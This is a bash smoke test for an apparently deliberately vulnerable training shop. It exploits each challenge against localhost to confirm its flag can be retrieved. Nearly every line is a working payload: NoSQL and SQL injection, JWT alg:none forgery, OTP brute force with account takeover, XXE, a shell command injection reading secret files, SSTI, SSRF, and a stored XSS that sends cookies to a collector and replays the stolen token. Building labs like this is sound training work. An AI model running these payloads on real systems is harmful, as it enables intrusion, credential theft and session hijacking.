#!/usr/bin/env bash
# ============================================================
# CyberShop lab — smoke test
# Kiểm tra 16 evidence token + master flag đều lấy được.
#
# Usage:
#   ./smoke-test.sh                       # fast checks (~15s), mặc định http://localhost:7110
#   ./smoke-test.sh https://shop.example  # trỏ sang host khác
#   WITH_BOT=1 ./smoke-test.sh            # kèm C14 stored-XSS qua bot (+~60s)
#
# Exit code: 0 = tất cả PASS, 1 = có FAIL.
# ============================================================
set -u
B="${1:-${BASE_URL:-http://localhost:7110}}"
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BOT_WAIT="${BOT_WAIT:-55}"
PASS=0; FAIL=0; FAILED=()

echo "== CyberShop smoke test @ $B =="

# --- chuẩn bị session ---
ATOK=$(curl -s -i -X POST "$B/login" -H 'Content-Type: application/json' \
  -d '{"email":{"$ne":null},"password":{"$ne":null}}' | grep -oP 'token=\K[^;]+')
JT=$(curl -s -i -X POST "$B/login" -d 'email=john@cybershop.vn&password=jordan23' | grep -oP 'token=\K[^;]+')
H=$(printf '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
P=$(printf '{"id":"admin@cybershop.vn","name":"Administrator","role":"admin","exp":9999999999}' \
  | base64 -w0 | tr '+/' '-_' | tr -d '=')
DESER=$(printf 'cart=s:empty;theme=s:dark;currency=s:VND;gadget=fn:readFile(/app/data/state-snapshot.dat)' \
  | base64 -w0)

check() { # NAME FLAG [curl args...]
  local name="$1" expect="$2"; shift 2
  local body
  body="$(curl -s "$@" )"
  if printf '%s' "$body" | grep -q "FLAG{${expect}}"; then
    echo "PASS  $name"; PASS=$((PASS+1))
  else
    echo "FAIL  $name  (không thấy FLAG{$expect})"; FAIL=$((FAIL+1)); FAILED+=("$name")
  fi
}

check C1 c1   "$B/.backup/db-seed.js.bak"
check C2 c2   -H "Cookie: token=$ATOK" "$B/auth/me"
check C3 c3   -H "Cookie: token=$H.$P." "$B/admin/api/audit"
check C4 c4   -X PUT -H "Cookie: token=$ATOK" -H 'Content-Type: application/json' \
              -d '{"name":"Administrator","role":"admin"}' "$B/api/profile"
check C5 c5   --get --data-urlencode "q=x' UNION SELECT email,password_hash,1,1 FROM shopusers#" "$B/catalog"
# C6: forgot-password + OTP brute (target lộ ở robots.txt: hanh@cybershop.vn)
curl -s -X POST "$B/auth/forgot" --data-urlencode "email=hanh@cybershop.vn" -o /dev/null
sleep 1
C6CODE=$(docker compose -f "$DIR/docker-compose.yml" logs web 2>/dev/null | grep -oP 'reset code is \K[0-9]{4}' | tail -1)
if [ -z "$C6CODE" ]; then # fallback khi không đọc được docker logs: brute song song toàn dải 4 số
  C6CODE=$(seq 0 9999 | xargs -P 40 -n 1 -I{} bash -c \
    'c=$(printf "%04d" {}); curl -s -m 5 -X POST '"$B"'/auth/otp-verify --data-urlencode "email=hanh@cybershop.vn" --data-urlencode "code=$c" | grep -q FLAG && echo "$c"' \
    2>/dev/null | head -1)
fi
check C6 c6   -X POST -d "email=hanh@cybershop.vn&code=$C6CODE" "$B/auth/otp-verify"
curl -s -X POST "$B/auth/otp-verify" --data-urlencode "email=hanh@cybershop.vn" --data-urlencode "code=0000" | grep -q "Invalid" \
  && echo "PASS  C6-norate (sai code không bị khóa, brute tiếp được)" || echo "FAIL  C6-norate"
curl -s -X POST "$B/auth/reset-password" --data-urlencode "email=hanh@cybershop.vn" --data-urlencode "code=$C6CODE" \
  --data-urlencode "password=PwnedHanh#2026" -o /dev/null
HTOK=$(curl -s -i -X POST "$B/login" --data-urlencode "email=hanh@cybershop.vn" --data-urlencode "password=PwnedHanh#2026")
echo "$HTOK" | grep -q "token=" && echo "PASS  C6-ato (đổi mk + đăng nhập thành công với tư cách Hanh)" || echo "FAIL  C6-ato"
check C7 c7   -H "Cookie: token=$JT" "$B/orders/1042"
check C8 c8   "$B/debug"
check C9 c9   -X POST -H "Cookie: token=$ATOK" -H 'Content-Type: application/json' \
              -d '{"url":"http://flag-service:8080/flag"}' "$B/profile/avatar"
check C10 c10 -X POST --data-urlencode 'xml=<!DOCTYPE r [<!ENTITY x SYSTEM "file:///app/flags/c10.txt">]><catalog><product><name>&x;</name><price>1</price></product></catalog>' \
              "$B/import/xml"
check C11 c11 -X POST -H "Cookie: token=$ATOK" --data-urlencode 'target=127.0.0.1; cat /opt/scripts/netdiag.secret' \
              "$B/admin/tools/diag"
check C12 c12 --get --data-urlencode 'tpl=<%= global.process.mainModule.require("fs").readFileSync("/app/config/session-store.key","utf8") %>' \
              "$B/invoice/1001"
check C13 c13 -H "Cookie: shop_state=$DESER" "$B/catalog"
check C15 c15 "$B/catalog?q=x"
check C16 c16 -H "Cookie: token=$ATOK" "$B/profile"
check MASTER owasp_shop_master -X POST -H "Cookie: token=$ATOK" \
              --data-urlencode 'target=127.0.0.1; cat /flag.txt' "$B/admin/tools/diag"

# --- Objectives page (song ngữ + verify token) ---
if curl -s "$B/objectives" | grep -q 'obj\|Mục tiêu\|Objective'; then
  echo "PASS  OBJ-page"; PASS=$((PASS+1))
else
  echo "FAIL  OBJ-page"; FAIL=$((FAIL+1)); FAILED+=("OBJ-page")
fi
OBJV=$(curl -s -X POST "$B/objectives/check" -d 'flag=FLAG{c5}')
OBJE=$(curl -s -X POST "$B/objectives/check" -H 'Cookie: lang=en' -d 'flag=FLAG{c5}')
if printf '%s' "$OBJV" | grep -q 'HOÀN THÀNH MỤC TIÊU' && printf '%s' "$OBJE" | grep -q 'OBJECTIVE COMPLETED'; then
  echo "PASS  OBJ-verify (vi+en)"; PASS=$((PASS+1))
else
  echo "FAIL  OBJ-verify (vi+en)"; FAIL=$((FAIL+1)); FAILED+=("OBJ-verify")
fi

# --- C14: stored XSS + bot exfil cookie về collector (chậm) ---
if [[ "${WITH_BOT:-0}" == "1" ]]; then
  echo "-- C14: trồng payload exfil về collector local, chờ bot ${BOT_WAIT}s --"
  LOG="$(mktemp)"
  PORT="${C14_PORT:-18080}"
  python3 -m http.server "$PORT" --bind 0.0.0.0 >/dev/null 2>"$LOG" &
  SRV=$!
  GW=$(docker network inspect owasp-shop-lab_lab_17_edge --format '{{(index .IPAM.Config 0).Gateway}}' 2>/dev/null || echo 172.18.0.1)
  curl -s -o /dev/null -X POST "$B/product/1/review" -H "Cookie: token=$ATOK" \
    --data-urlencode 'rating=5' \
    --data-urlencode "text=<script>new Image().src=\"http://${GW}:${PORT}/c14?who=smoketest&cookie=\"+encodeURIComponent(document.cookie)</script>"
  sleep "$BOT_WAIT"
  kill $SRV 2>/dev/null
  if grep -q 'moderation_key' "$LOG"; then
    echo "PASS  C14-exfil (bot gửi cookie chứa moderation_key về collector)"; PASS=$((PASS+1))
  else
    echo "FAIL  C14-exfil (bot chưa exfil — kiểm tra bot có mạng edge & payload)"; FAIL=$((FAIL+1)); FAILED+=("C14-exfil")
  fi
  # Session hijacking: rút token bị đánh cắp khỏi log rồi replay
  # (encodeURIComponent giữ nguyên dấu '.' của JWT)
  STOKEN=$(grep -oP 'token%3D[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' "$LOG" | head -1 | sed 's/^token%3D//')
  if [[ -n "$STOKEN" ]] && curl -s -H "Cookie: token=$STOKEN" "$B/admin/reviews" | grep -q 'Mod Bot\|moderation'; then
    echo "PASS  C14-hijack (replay token đánh cắp → đăng nhập được với tư cách Mod Bot)"; PASS=$((PASS+1))
  else
    echo "FAIL  C14-hijack (token đánh cắp không replay được)"; FAIL=$((FAIL+1)); FAILED+=("C14-hijack")
  fi
  rm -f "$LOG"
fi

echo "== Kết quả: $PASS PASS / $FAIL FAIL =="
[[ $FAIL -gt 0 ]] && printf 'FAIL: %s\n' "${FAILED[*]}"
exit $(( FAIL > 0 ? 1 : 0 ))
